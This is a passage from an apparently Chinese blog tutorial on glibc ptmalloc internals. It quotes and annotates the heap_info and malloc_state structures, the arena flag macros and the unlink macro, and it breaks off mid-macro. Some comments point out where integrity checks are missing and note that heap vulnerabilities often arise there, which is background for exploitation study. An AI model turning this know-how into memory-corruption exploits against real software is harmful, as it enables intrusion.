的数据段。</p><h5 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h5><p>程序刚开始执行时，每个线程是没有 heap 区域的。当其申请内存时，就需要一个结构来记录对应的信息，而 heap_info 的作用就是这个。而且当该 heap 的资源被使用完后，就必须得再次申请内存了。此外，一般申请的 heap 是不连续的，因此需要记录不同 heap 之间的链接结构。</p><p><strong>该数据结构是专门为从 Memory Mapping Segment 处申请的内存准备的，即为非主线程准备的。</strong></p><p>主线程可以通过 sbrk() 函数扩展 program break location 获得（直到触及 Memory Mapping Segment），只有一个 heap，没有 heap_info 数据结构。</p><p><strong>heap_info 的主要结构如下</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_MIN_SIZE (32 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HEAP_MAX_SIZE</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> DEFAULT_MMAP_THRESHOLD_MAX</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> HEAP_MAX_SIZE (1024 * 1024) <span class="comment">/* must be a power of two */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps</span></span><br><span class="line"><span class="comment">   that are dynamically created for multi-threaded programs.  The</span></span><br><span class="line"><span class="comment">   maximum size must be a power of two, for fast determination of</span></span><br><span class="line"><span class="comment">   which heap belongs to a chunk.  It should be much larger than the</span></span><br><span class="line"><span class="comment">   mmap threshold, so that requests with a size just below that</span></span><br><span class="line"><span class="comment">   threshold can be fulfilled without creating too many heaps.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* A heap is a single contiguous memory region holding (coalesceable)</span></span><br><span class="line"><span class="comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span></span><br><span class="line"><span class="comment">   address aligned to HEAP_MAX_SIZE.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_MIN_SIZE (32 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HEAP_MAX_SIZE</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> DEFAULT_MMAP_THRESHOLD_MAX</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> HEAP_MAX_SIZE (1024 * 1024) <span class="comment">/* 必须是2的幂次方 */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* HEAP_MIN_SIZE和HEAP_MAX_SIZE限制了为多线程程序动态创建的mmap()堆的大小。</span></span><br><span class="line"><span class="comment">   最大大小必须是2的幂次方，以便快速确定一个内存块属于哪个堆。</span></span><br><span class="line"><span class="comment">   它应该比mmap阈值大得多，这样可以满足大小接近阈值的请求而不会创建太多堆。 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 堆（heap）是一个连续的内存区域，包含（可合并的）malloc_chunk。</span></span><br><span class="line"><span class="comment">   它是通过mmap()分配的，并且始终从HEAP_MAX_SIZE对齐的地址开始。 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* 该堆所属的Arena。 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* 前一个堆。 */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* 当前大小（以字节为单位）。 */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* 已通过mprotect设置为PROT_READ|PROT_WRITE的内存大小（以字节为单位）。 */</span></span><br><span class="line">  <span class="comment">/* 确保以下数据正确对齐，特别是sizeof(heap_info) + 2 * SIZE_SZ是MALLOC_ALIGNMENT的倍数。 */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该结构主要是描述堆的基本信息，包括</p><ul><li><strong>堆对应的 arena 的地址</strong></li><li>由于一个线程申请一个堆之后，可能会使用完，之后就必须得再次申请。因此，一个线程可能会有多个堆。prev 即记录了上一个 heap_info 的地址。这里可以看到每个堆的 heap_info 是<strong>通过单向链表进行链接的。</strong></li><li><strong>size 表示当前堆的大小</strong></li><li>最后一部分<strong>确保对齐</strong></li></ul><p><strong>pad 里负数的缘由是什么呢？</strong></p><p><code>pad</code> 是为了确保分配的空间是按照 <code>MALLOC_ALIGN_MASK+1</code> (记为 <code>MALLOC_ALIGN_MASK_1</code>) 对齐的。在 <code>pad</code> 之前该结构体一共有 6 个 <code>SIZE_SZ</code> 大小的成员, 为了确保 <code>MALLOC_ALIGN_MASK_1</code> 字节对齐, 可能需要进行 <code>pad</code>，不妨假设该结构体的最终大小为 <code>MALLOC_ALIGN_MASK_1*x</code>，其中 <code>x</code> 为自然数，那么需要 <code>pad</code> 的空间为 <code>MALLOC_ALIGN_MASK_1 * x - 6 * SIZE_SZ = (MALLOC_ALIGN_MASK_1 * x - 6 * SIZE_SZ) % MALLOC_ALIGN_MASK_1 = 0 - 6 * SIZE_SZ % MALLOC_ALIGN_MASK_1=-6 * SIZE_SZ % MALLOC_ALIGN_MASK_1 = -6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK</code>。</p><p>看起来该结构应该是相当重要的，但是如果如果我们仔细看完整个 malloc 的实现的话，就会发现它出<strong>现的频率并不高。</strong></p><h5 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h5><p><strong>该结构用于管理堆</strong>，<strong>记录每个 arena 当前申请的内存的具体状态</strong>，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。<strong>无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构</strong>。由于 thread 的 arena 可能有多个，malloc state 结构会在最新申请的 arena 中。</p><p><strong>注意，main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so 的数据段。</strong></p><p>其结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="comment">/* 序列化访问 */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="comment">/* 标志位（以前在 max_fast 中） */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="comment">/* 如果 fastbin 块包含最近插入的空闲块，则设置为 1 */</span></span><br><span class="line">  <span class="comment">/* 注意，这是一个布尔值，但并非所有目标平台都支持对布尔值的原子操作 */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  <span class="comment">/* 最顶层块的基址 -- 不在任何 bin 中 */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  <span class="comment">/* 最近一次拆分小型请求产生的剩余块 */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  <span class="comment">/* 正常 bins，按照上述描述进行打包 */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="comment">/* bins 的位图 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="comment">/* 链表 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="comment">/* 用于空闲 arenas 的链表。访问该字段由 arena.c 中的 free_list_lock 进行序列化 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">     Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  </span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">   <span class="comment">/* 附加到该 arena 的线程数。如果该 arena 在空闲列表中，则为 0。访问该字段由 arena.c 中的              free_list_lock 进行序列化 */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  <span class="comment">/* 在该 arena 中从系统分配的内存 */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>_libc_lock_define(, mutex);</strong><ul><li>该变量<strong>用于控制程序串行访问同一个分配区</strong>，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成后才能够使用。</li></ul></li><li><strong>flags</strong><ul><li>flags 记录了分配区的一些标志，比如 bit0 记录了分配区是否有 fast bin chunk ，bit1 标识分配区是否能返回连续的虚拟地址空间。具体如下</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span></span><br><span class="line"><span class="comment">   some fastbin chunks. It is set true on entering a chunk into any</span></span><br><span class="line"><span class="comment">   fastbin, and cleared only in malloc_consolidate.</span></span><br><span class="line"><span class="comment">   The truth value is inverted so that have_fastchunks will be true</span></span><br><span class="line"><span class="comment">   upon startup (since statics are zero-filled), simplifying</span></span><br><span class="line"><span class="comment">   initialization checks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment">   regions.  Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment">   when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span></span><br><span class="line"><span class="comment">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span></span><br><span class="line"><span class="comment">   allocated in that arena before detecting corruption are not freed.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTCHUNKS_BIT在max_fast中表示可能存在一些fastbin块。</span></span><br><span class="line"><span class="comment">   它在将块放入任何fastbin时设置为true，并且仅在malloc_consolidate中清除。</span></span><br><span class="line"><span class="comment">   真值取反，以便在启动时have_fastchunks为true（因为静态变量被零填充），</span></span><br><span class="line"><span class="comment">   简化了初始化检查。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT指示MORECORE不返回连续的内存区域。</span></span><br><span class="line"><span class="comment">   否则，在可能的情况下，利用连续性合并连续MORECORE调用的结果。</span></span><br><span class="line"><span class="comment">   初始值来自MORECORE_CONTIGUOUS，但如果mmap被用作sbrk替代品，则会动态更改。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ARENA_CORRUPTION_BIT如果在arena上检测到内存损坏，则设置。</span></span><br><span class="line"><span class="comment">   这样的arena不再用于分配块。在检测到损坏之前在该arena中分配的块不会被释放。 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><strong>fastbinsY[NFASTBINS]</strong><ul><li><strong>存放每个 fast chunk 链表头部的指针</strong></li></ul></li><li><strong>top</strong><ul><li><strong>指向分配区的 top chunk</strong></li></ul></li><li><strong>last_reminder</strong><ul><li><strong>最新的 chunk 分割之后剩下的那部分</strong></li></ul></li><li><strong>bins</strong><ul><li><strong>用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</strong></li></ul></li><li><strong>binmap</strong><ul><li><strong>ptmalloc 用一个 bit 来标识某一个 bin 中是否包含空闲 chunk 。</strong></li></ul></li></ul><h5 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h5><p><strong>！！待补充！！</strong></p><h4 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h4><h5 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h5><p>unlink 用来<strong>将一个双向链表（只存储空闲的 chunk）中的一个元素取出来</strong>，可能在以下地方使用</p><ul><li><strong>malloc</strong><ul><li>从恰好大小合适的 large bin 中获取 chunk。<ul><li><strong>这里需要注意的是 fastbin 与 small bin 就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。</strong></li><li><strong>依次遍历处理 unsorted bin 时也没有使用 unlink 。</strong></li></ul></li><li>从比请求的 chunk 所在的 bin 大的 bin 中取 chunk。</li></ul></li><li><strong>free</strong><ul><li>后向合并，合并物理相邻低地址空闲 chunk。</li><li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li><li><strong>malloc_consolidate</strong><ul><li>后向合并，合并物理相邻低地址空闲 chunk。</li><li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li><li><strong>realloc</strong><ul><li>前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li></ul><p>由于 unlink 使用非常频繁，所以 unlink 被实现为了一个宏，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="comment">// unlink p</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    <span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               </span><br><span class="line">    FD = P-&gt;fd;                                                                      </span><br><span class="line">    BK = P-&gt;bk;                                                                      </span><br><span class="line">    <span class="comment">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                                                      </span><br><span class="line">        FD-&gt;bk = BK;                                                              </span><br><span class="line">        BK-&gt;fd = FD;                                                              </span><br><span class="line">        <span class="comment">// 下面主要考虑 P 对应的 nextsize 双向链表的修改</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                              </span><br><span class="line">            <span class="comment">// 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。</span></span><br><span class="line">            <span class="comment">// 那么其实也就没有必要对 nextsize 字段进行修改了。</span></span><br><span class="line">            <span class="comment">// 这里没有去判断 bk_nextsize 字段，可能会出问题。</span></span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                      </span><br><span class="line">            <span class="comment">// 类似于小的 chunk 的检查思路</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              </span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">              malloc_printerr (check_action,                                      </span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">                               P, AV);                                              </span><br><span class="line">            <span class="comment">// 这里说明 P 已经在 nextsize 链表中了。</span></span><br><span class="line">            <span class="comment">// 如果 FD 没有在 nextsize 链表中</span></span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                      </span><br><span class="line">                <span class="comment">// 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P</span></span><br><span class="line">                <span class="comment">// 令 FD 为 nextsize 串起来的</span></span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                    </span><br><span class="line">                <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                <span class="comment">// 否则我们需要将 FD 插入到 nextsize 形成的双链表中</span></span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              </span><br><span class="line">                  &#125;                                                              </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                <span class="comment">// 如果在的话，直接拿走即可</span></span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      